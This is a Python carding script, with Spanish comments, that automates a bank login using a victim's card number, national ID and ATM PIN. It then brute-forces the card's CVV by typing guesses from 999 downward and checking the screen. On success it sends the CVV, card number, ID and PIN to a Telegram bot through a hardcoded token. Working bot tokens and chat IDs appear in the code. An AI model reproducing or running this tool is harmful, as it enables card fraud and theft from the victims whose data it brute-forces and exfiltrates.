import pyautogui as robot
import time 
import telegram

afiliacion = 279,1013
#tipodedocumento = 1427,572
#click_dni = 1406,417
Ndocumento = 417,648
Ntarjeta = 417,715
Nclavecajero = 417,924
CVV = 417,807
continuar = 292,1021
#reintentar = 1637,984
escape = 544,76

# Este es miooo de hernyu
# no compartir por error, si eres alguien tmre me descuide 
#bot_token = '1959389123:AAGkakayuPQkmkwYhoVWTJJjMgLdxgyYgGU'
#chat_id = '1820912669'
#bot = telegram.Bot(token=bot_token)

bot_token2 = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
chat_id2 = '1850445278'
bot2 = telegram.Bot(token=bot_token2)

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir dato
print("\n")
print("El programa trabaja de manera descendente 999...998...997...")
print(" Para el fumon de crack movi ")
print("\n")
print("*****************")
print("Escriba los datos: ")
victima_tar = input("Tarjeta: ")
victima_dni = input("DNI: ")
victima_pasw = input("Clave de cajero: ")
print("*****************")
inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))
print("*****************")
print("Presione 'Enter' para continuar")
input()
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
time.sleep(0.5)


#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(2)
	#abrir(tipodedocumento) # poner documento dni
	#time.sleep(1)
	#abrir(click_dni)
	#time.sleep(0.3)
	abrir(Ndocumento)
	robot.typewrite(victima_dni)
	time.sleep(0.3)
	abrir(Ntarjeta)
	robot.typewrite(victima_tar)
	time.sleep(0.3)
	abrir(Nclavecajero)
	robot.typewrite(victima_pasw)
	time.sleep(0.3)

print(":D")

logeo()

#ccv intento
abrir(CVV)
robot.press('backspace')
robot.press('backspace')
robot.press('backspace')
time.sleep(0.1)
if inicio < 100:
	robot.typewrite("0")
	robot.typewrite(str(inicio))
	time.sleep(0.2)
else:
	robot.typewrite(str(inicio))
	time.sleep(0.2) #tipear

abrir(continuar)
time.sleep(1)

# Para ver cuanto demora en cargar
blanco =  True
contadorEmergencia = 0
while blanco is True :
	try:
		contadorEmergencia += 1
		blanco = robot.pixelMatchesColor(503,315,(205,211,218))
		print("Cargando..."+ blanco)
		time.sleep(0.1)
		if (blanco is False) or (contadorEmergencia >20):
			print("continuando!!")
			break
	except:
		time.sleep(0.1)
		#print("...")

contador = 0 # para reiniciar 

try:

	while inicio>fin :  # >  < # desde 999 para abajo
		
		contador += 1
		#print(contador)
		if contador > 85 : # Reiniciar 
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(2)

			logeo() # Logeandose de nuevo

			print("Continuando...")
			contador=0

		print("Intentado con: ",inicio)

		registro = open("registro.txt","a")
		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")
		registro.close()
		inicio = inicio - 1

		time.sleep(0.1)
		#print("Borrando") ##################
		abrir(CVV)
		robot.press('backspace')
		robot.press('backspace')
		robot.press('backspace')
		time.sleep(0.1)
		#por si son bajos de 100
		if inicio < 100:
			robot.typewrite("0")
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #######################
		else:
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #########################
		#time.sleep(0.1)

		time.sleep(0.3)
		abrir(continuar)
		# Para ver cuanto demora en cargar
		blanco =  True
		contadorEmergencia = 0
		while blanco is True :
			try:
				contadorEmergencia += 1
				blanco = robot.pixelMatchesColor(503,315,(205,211,218))
				print("Cargando..."+ blanco)
				time.sleep(0.1)
				if (blanco is False) or (contadorEmergencia >20):
					print("continuando!!")
					break
			except:
				time.sleep(0.1)
				#print("...")
		#time.sleep(0.1)
		
		print("--------------------------------")
		contadorerror = 0
		b = None
		c = None
		#print("Entrando")
		lives = open("lives.txt","a")
		while (b is None) and (c is None):# Un " Y " poqe si no cumple 1 se rompe el bucle
			imgAfi = "imgAfi.png"
			b = robot.locateOnScreen(imgAfi, grayscale=True, confidence=0.9, region=(0,0,570,1036))
			#print(b, "b")
			#time.sleep(1)
			
			Encontrado = "Encontrado.png"
			c = robot.locateOnScreen(Encontrado, grayscale=True, confidence=0.9, region=(0,0,570,1036))
			#print(c, "c")
			#time.sleep()
			if (b == None) or (c == None):
				time.sleep(0.2)
				#print("Espere...")
				#print(b)
				#time.sleep(5)
			if contadorerror > 60: # Por si no encuyentra ninguno
				print("Ocurrió un error inesperado")
				lives.close()
				exit()
			contadorerror += 1

		time.sleep(0.3)

		#if b!=None:
			#print("No es: ",inicio)
			#time.sleep(0.5)
		if c!=None: # Por si es LIVE:
			print ('\a')
			bot2.send_message(chat_id=chat_id2, text = "-------------")
			bot2.send_message(chat_id=chat_id2, text = 'CVV encontrada: '+str(inicio))
			bot2.send_message(chat_id=chat_id2, text = str(victima_tar))
			bot2.send_message(chat_id=chat_id2, text = str(victima_dni))
			bot2.send_message(chat_id=chat_id2, text = str(victima_pasw))

			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()


	print("Intentado con: ",inicio)
	print ('\a')
	print("Programa finalizado con exito")
	txt= "Programa finalizado con exito"

except:
	#robot.alert("ERROR") 
	print ('\a')
	print("Error en el programa")
	print("\nEl numero se quedó en: ", inicio)

print("Presione 'Enter' para continuar")
input()



